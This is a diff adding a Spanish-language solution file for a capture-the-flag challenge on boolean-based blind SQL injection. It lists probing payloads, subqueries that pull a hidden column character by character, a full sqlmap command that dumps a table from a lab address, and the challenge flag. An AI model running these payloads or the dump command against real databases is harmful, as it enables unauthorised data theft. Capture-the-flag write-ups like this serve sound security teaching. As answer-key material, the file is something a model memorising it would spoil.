@@ -1,0 +1,19 @@
+=========================================
+SOLUCIONARIO RETO 10 - BLIND SQLi
+=========================================
+Vulnerabilidad: Inyección SQL Ciega basada en Booleanos.
+
+PASOS PARA LA EXPLOTACIÓN:
+1. Confirmamos vulnerabilidad: 
+   - '1 AND 1=1' -> ACTIVO LOCALIZADO.
+   - '1 AND 1=2' -> NO ENCONTRADO.
+2. Extraer la longitud de la flag (opcional pero ayuda):
+   1 AND (SELECT length(secreto) FROM boveda_seguridad) = 28
+3. Extraer el primer carácter:
+   1 AND (SELECT hex(substr(secreto,1,1)) FROM boveda_seguridad) = hex('C')
+   O más simple:
+   1 AND (SELECT substr(secreto,1,1) FROM boveda_seguridad) = 'C'
+4. Como es tedioso, se recomienda usar un script en Python o la herramienta 'sqlmap' con modo --technique=B.
+sqlmap -u "http://192.168.70.43:5010/" --data="id=1" --method=POST --dbms=sqlite --technique=B --string="LOCALIZADO" --batch -T boveda_seguridad --dump
+FLAG OBTENIDA:
+COMANDO{BL1ND_SQL1_M4ST3R_B0L}
